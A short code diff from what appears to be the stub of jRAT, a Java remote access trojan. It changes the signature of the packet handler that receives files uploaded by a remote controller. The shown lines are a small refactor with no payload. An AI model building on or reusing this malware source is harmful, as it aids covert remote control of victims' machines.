@@ -16,7 +16,7 @@ import se.jrat.stub.packets.outgoing.Packet31CompleteClientUpload;
 public class Packet21ClientUploadFile extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		final String rawFile = Connection.instance.readLine();
 		final File file = new File(rawFile);
 
